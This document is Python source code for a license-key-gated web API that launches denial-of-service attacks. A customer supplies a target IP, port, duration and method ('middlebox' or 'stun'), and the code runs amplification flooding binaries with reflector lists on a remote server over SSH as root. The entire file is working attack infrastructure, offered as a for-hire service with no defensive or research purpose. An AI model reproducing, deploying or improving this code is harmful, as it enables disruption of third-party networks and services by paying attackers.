# Made by libalpm64 2024

import re, paramiko, asyncio
from typing import Optional
from concurrent.futures import ThreadPoolExecutor
from threading import Semaphore
from fastapi import BackgroundTasks, FastAPI, HTTPException, Query, Request
from fastapi.responses import JSONResponse

app = FastAPI()
ongoing_attacks = set()
MAX_CONCURRENT_SSH = 5
ssh_semaphore = Semaphore(MAX_CONCURRENT_SSH)
SERVER_IP = "IPGOESHERE"
SERVER_USER = "root"
SERVER_PASS = "password"
METHODS = ["middlebox", "stun"]
LICENSE_KEY = "Licensekey"

SSH_TIMEOUT = 30
executor = ThreadPoolExecutor()


@app.exception_handler(HTTPException)
async def custom_http_exception_handler(request: Request, exc: HTTPException):
    return JSONResponse(
        status_code=exc.status_code,
        content={"detail": "An error occurred. Please check your input."},
    )


def check_license_key(input_key: str) -> bool:
    return input_key == LICENSE_KEY


def run_ssh_command(command):
    with ssh_semaphore:  # Use the semaphore to limit concurrent SSH sessions
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(SERVER_IP, username=SERVER_USER, password=SERVER_PASS)
            stdin, stdout, stderr = client.exec_command(command, timeout=SSH_TIMEOUT)
            stdout.channel.recv_exit_status()  # This blocks until the command is finished
        except (
            paramiko.SSHException,
            paramiko.AuthenticationException,
            paramiko.ssh_exception.NoValidConnectionsError,
        ) as e:
            print(f"SSH error occurred: {e}")
        finally:
            client.close()


async def execute_ssh_command(command, attack_key):
    loop = asyncio.get_event_loop()
    try:
        await loop.run_in_executor(executor, run_ssh_command, command)
    finally:
        ongoing_attacks.remove(attack_key)


def is_valid_ip(ip: str) -> bool:
    return re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) is not None


def is_valid_port(port: int) -> bool:
    return 0 < port < 65536


def has_rce(value: str) -> bool:
    return any(char in value for char in [";", "&", "|"])


def sanitize_input(input_value: str) -> str:
    return re.sub(r"[^a-zA-Z0-9._-]", "", input_value)


@app.get("/attack/")
async def run_attack(
    background_tasks: BackgroundTasks,
    key: str = Query(..., max_length=100),
    host: str = Query(..., pattern=r"^\d{1,3}(\.\d{1,3}){3}$"),
    port: int = Query(..., gt=0, lt=65536),
    time: int = Query(..., ge=1, le=3000),
    method: str = Query(..., max_length=50),
    action: Optional[str] = Query(None),
):

    if has_rce(key) or has_rce(host) or has_rce(method) or (action and has_rce(action)):
        raise HTTPException(status_code=400, detail="Nice Try")
      
    key = sanitize_input(key)
    host = sanitize_input(host)
    method = sanitize_input(method)
    action = sanitize_input(action) if action else None

    if not check_license_key(key):
        raise HTTPException(status_code=403, detail="Invalid license key.")

    if not is_valid_ip(host) or not is_valid_port(port):
        raise HTTPException(status_code=400, detail="Invalid IP or port.")

    if method not in METHODS:
        raise HTTPException(status_code=400, detail="Invalid attack method.")

    if time > 3000:
        raise HTTPException(status_code=400, detail="Attack too long.")

    attack_key = f"{host}:{port}:{method}"
    if attack_key in ongoing_attacks:
        raise HTTPException(status_code=400, detail="Attack already ongoing.")
    ongoing_attacks.add(attack_key)
  
    command = ""
    if method == "middlebox":
        command = f"cd /root/; ./middleboxv3 {host} {port} cleanedmb.txt 3 600000 {time}"
    elif method == "stun":
       command = f"cd /root/; ./snmp {host} {port} filtered-snmp1.lst 2 -1 {time}"

    background_tasks.add_task(execute_ssh_command, command, attack_key)
    return {"message": "Command sent to server."}


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="127.0.0.1", port=8001)
